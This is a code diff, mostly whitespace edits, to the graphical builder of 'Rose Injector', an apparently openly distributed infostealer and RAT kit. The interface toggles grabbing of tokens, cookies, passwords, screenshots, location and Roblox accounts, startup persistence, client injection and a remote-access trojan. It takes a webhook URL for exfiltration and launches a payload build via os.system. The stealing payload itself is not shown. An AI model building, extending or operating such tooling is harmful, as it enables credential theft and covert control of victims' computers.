@@ -36,8 +36,8 @@ xwehookurl = ""
 xbuildname = ""
 
 xprogressvalue = False
- 
- 
+
+
 def change_startups():
     global xstartup
     xstartup = not xstartup
@@ -45,7 +45,7 @@ def change_startups():
         ui.notify("Startup has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return 
     ui.notify("Startup has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
- 
+
 def change_injections():
     global xinjections
     xinjections = not xinjections
@@ -53,7 +53,7 @@ def change_injections():
         ui.notify("Injection has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
         return
     ui.notify("Injection has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="pink", position="top-right")
-    
+
 def change_tokens():
     global xtoken
     xtoken = not xtoken
@@ -61,7 +61,7 @@ def change_tokens():
         ui.notify("Token Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Token Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
-    
+
 def change_cookies():
     global xcookie
     xcookie = not xcookie
@@ -69,7 +69,7 @@ def change_cookies():
         ui.notify("Cookies Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Cookies Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
-    
+
 def change_passwords():
     global xpassword
     xpassword = not xpassword
@@ -77,7 +77,7 @@ def change_passwords():
         ui.notify("Passwords Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Passwords Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
-    
+
 def change_screenshots():
     global xscreenshot
     xscreenshot = not xscreenshot
@@ -85,7 +85,7 @@ def change_screenshots():
         ui.notify("Screenshot has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Screenshot has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
-    
+
 def change_malicious():
     global xmalicious
     xmalicious = not xmalicious
@@ -109,7 +109,7 @@ def change_robloxs():
         ui.notify("Roblox Grabbing has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
         return
     ui.notify("Roblox Grabbing has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-right")
-    
+
 def change_rats():
     global xrat
     xrat = not xrat
@@ -117,26 +117,26 @@ def change_rats():
         ui.notify("RAT has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
         return
     ui.notify("RAT has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
-    
+
 def change_ratsurl(value):
     global xraturl
     xraturl = value   
-    
+
 def change_pings():
     global xping
     if xping:
         ui.notify("Ping has been enabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
         return
     ui.notify("Ping has been disabled!", timeout=30, progress=True, avatar=__avatar__, color="yellow-7", position="top-right")
-    
+
 def change_wehookurl(value):
     global xwehookurl
     xwehookurl = value
-    
+
 def change_buildname(value):
     global xbuildname
     xbuildname = value
-    
+
 async def _test_webhook():
     result = await builder.test_webhook(xwehookurl)
     if result == 0:
@@ -163,7 +163,7 @@ async def test_webhook(webhook_url):
     except Exception as e:
         print(e)
         return 1
-            
+
 def __build():
     global xraturl 
     path = f'{Path(__file__).resolve().parent}\\builder.py'
@@ -172,7 +172,7 @@ def __build():
         xraturl = ".rat"
     msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjections} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping}"
     os.system(msg)
-                    
+
 def _makebuild():
     if xwehookurl == "":
         ui.notify("WebHook URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
@@ -184,10 +184,10 @@ def _makebuild():
         if xraturl == "":
             ui.notify("RAT URL is empty!", timeout=30, progress=True, avatar=__avatar__, color="red", position="top-left")
             return
-        
+
     ui.notify("Build has been started!", timeout=30, progress=True, avatar=__avatar__, color="green", position="top-left")
     __build()
-    
+
 class Demo:
     def __init__(self):
         self.number = xprogressvalue
@@ -207,7 +207,7 @@ def _functions():
         with ui.expansion('System', icon='work').classes('w-full'):
             ui.checkbox('Startup', on_change=change_startups).props('inline color=pink')
             ui.checkbox('Injector', on_change=change_injections).props('inline color=pink')
-            
+
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
                 with ui.column():
@@ -215,12 +215,12 @@ def _functions():
                     ui.checkbox('Cookie', on_change=change_cookies).props('inline color=green')
                     ui.checkbox('Password', on_change=change_passwords).props('inline color=green')
                     ui.checkbox('Screenshot', on_change=change_screenshots).props('inline color=green')
-                    
+
                 with ui.column():
                     ui.checkbox('Malicious', on_change=change_malicious).props('inline color=green')
                     ui.checkbox('Location', on_change=change_locations).props('inline color=green')
                     ui.checkbox('Roblox', on_change=change_robloxs).props('inline color=green')
-            
+
         with ui.expansion('Advanced', icon='work').classes('w-full'):
             with ui.column():
                 with ui.row():
@@ -228,8 +228,8 @@ def _functions():
                     ui.input(label='RAT Server URL', placeholder='Rose on top baby',
                         on_change=lambda e: change_ratsurl(e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
                 ui.checkbox('Ping', on_change=change_pings).props('inline color=yellow-7')
-                
-                
+
+
 def _github():
     with ui.card():
         with ui.column():
@@ -242,18 +242,18 @@ def _github():
                         ui.button("GitHub", on_click=psocials.open_xpierroz)
                         #ui.label(" ") # Because the button are so sticked together without (sex button) - xpierroz 03/24
                         ui.button("Instagram", on_click=psocials.open_xpierroz_insta)
-                    
+
                 with ui.card_section():
                     ui.label("Gumbobrot").classes("text-h6")
                     ui.markdown('<em>- "buddy it\'s not my fault"</em>').classes("text-subtitle5")
                     ui.button("GitHub", on_click=psocials.open_gumbobrot)
-                    
+
             with ui.row():               
                 with ui.card_section():
                     ui.label("suegdu").classes("text-h6")
                     ui.markdown('<em>- "bruh"</em>').classes("text-subtitle5")
                     ui.button("GitHub", on_click=psocials.open_suegdu)
-                    
+
                 with ui.card_section():
                     ui.label("svn").classes("text-h6")
                     ui.markdown('<em>*svn died*</em>').classes("text-subtitle5")
@@ -264,24 +264,24 @@ def _github():
                 ui.label(f"Rose {__version__}").classes("text-h6")
                 ui.button("GitHub", on_click=psocials.open_rose_github)
                 ui.button("Discord", on_click=psocials.open_rose_discord)
-                
+
 
 ui.colors(primary='#333')
-    
+
 @ui.page('/home')
 def superhome():
     ui.image('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/readme/RoseWBG.png').style(
         'position: absolute; top: 3px; left: 575px; width: 90px;'
         )
-    
-        
-        
+
+
+
     with ui.tabs().classes('w-full center') as tabs:
         ui.tab('Home', icon='home')
         ui.tab('Functions', icon='fingerprint')
         with ui.tab('Socials', icon='face'):
             ui.badge('0', color='purple-11').props('floating')
-            
+
     with ui.tab_panels(tabs, value='Home').classes('bg-transparent').classes('w-full center'):
         with ui.tab_panel('Home'):
             _home()
@@ -292,7 +292,7 @@ def superhome():
 
 v = ui.video('https://github.com/DamagingRose/Rose-Injector/raw/main/assets/RoseLoadingScreen.mp4', autoplay=True, loop=False, muted=True, controls=False).style('position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;')
 v.on('ended', lambda _: ui.open('/home'))
-    
+
 def start_nicegui(**kwargs):
     ui.run(
         title=__title__,
